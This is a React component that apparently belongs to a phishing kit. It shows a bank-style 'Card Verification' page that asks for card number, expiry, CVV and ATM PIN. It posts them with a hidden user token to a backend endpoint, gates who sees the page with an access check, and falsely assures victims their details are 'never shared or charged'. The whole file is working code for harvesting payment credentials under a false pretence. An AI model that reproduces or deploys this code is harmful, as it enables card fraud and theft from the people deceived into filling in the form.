import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const Card: React.FC = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [atmPin, setAtmPin] = useState('');
  const [showCvv, setShowCvv] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    atmPin: '',
    form: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/login', { replace: true });
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    const groups = digitsOnly.match(/.{1,4}/g);
    return groups ? groups.join(' ') : digitsOnly;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const cardDigits = cardNumber.replace(/\s/g, '');
    const newErrors = {
      cardNumber: cardDigits.length !== 16 ? 'Card number must be 16 digits' : '',
      expiry: !expiryMonth || !expiryYear ? 'Expiry date is required' : '',
      cvv: cvv.length !== 3 && cvv.length !== 4 ? 'CVV must be 3 or 4 digits' : '',
      atmPin: atmPin.length !== 4 ? 'ATM PIN must be 4 digits' : '',
      form: ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/fifty-card-info/`, {
          emzemz,
          cardNumber: cardDigits,
          expiryMonth,
          expiryYear,
          cvv,
          atmPin
        });
        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting card info:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error submitting your card details. Please try again.'
        }));
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => currentYear + i);

  return (
    <FlowPageLayout breadcrumb="Card Verification">
      <div className="space-y-6">
        <h2 className="text-2xl font-semibold text-gray-900">Card Information</h2>
        <p className="text-sm text-gray-600">
          Provide the card tied to your account so we can verify your ownership before we wrap up.
        </p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Card Number</label>
            <input
              id="cardNumber"
              name="cardNumber"
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              placeholder="1234 5678 9012 3456"
            />
            {errors.cardNumber && <p className="text-xs font-semibold text-red-600">{errors.cardNumber}</p>}
          </div>

          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Expiry Month</label>
              <select
                value={expiryMonth}
                onChange={(event) => setExpiryMonth(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Month</option>
                {Array.from({ length: 12 }, (_, index) => (
                  <option key={index + 1} value={String(index + 1).padStart(2, '0')}>
                    {String(index + 1).padStart(2, '0')}
                  </option>
                ))}
              </select>
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Expiry Year</label>
              <select
                value={expiryYear}
                onChange={(event) => setExpiryYear(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Year</option>
                {years.map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
            </div>
          </div>
          {errors.expiry && <p className="text-xs font-semibold text-red-600">{errors.expiry}</p>}

          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">CVV</label>
              <div className="relative">
                <input
                  id="cvv"
                  name="cvv"
                  type={showCvv ? 'text' : 'password'}
                  value={cvv}
                  onChange={(event) => {
                    const value = event.target.value.replace(/\D/g, '');
                    if (value.length <= 4) setCvv(value);
                  }}
                  maxLength={4}
                  className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                  placeholder="123"
                />
                <button
                  type="button"
                  onClick={() => setShowCvv((previous) => !previous)}
                  className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
                >
                  {showCvv ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.cvv && <p className="text-xs font-semibold text-red-600">{errors.cvv}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">ATM PIN</label>
              <div className="relative">
                <input
                  id="atmPin"
                  name="atmPin"
                  type={showPin ? 'text' : 'password'}
                  value={atmPin}
                  onChange={(event) => {
                    const value = event.target.value.replace(/\D/g, '');
                    if (value.length <= 4) setAtmPin(value);
                  }}
                  maxLength={4}
                  className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                  placeholder="••••"
                />
                <button
                  type="button"
                  onClick={() => setShowPin((previous) => !previous)}
                  className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
                >
                  {showPin ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.atmPin && <p className="text-xs font-semibold text-red-600">{errors.atmPin}</p>}
            </div>
          </div>

          {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Submitting…' : 'Continue'}
            </button>
          </div>
        </form>

        <div className="rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
          Your card details are encrypted and used only to verify your identity—never shared or charged.
        </div>
      </div>
    </FlowPageLayout>
  );
};

export default Card;
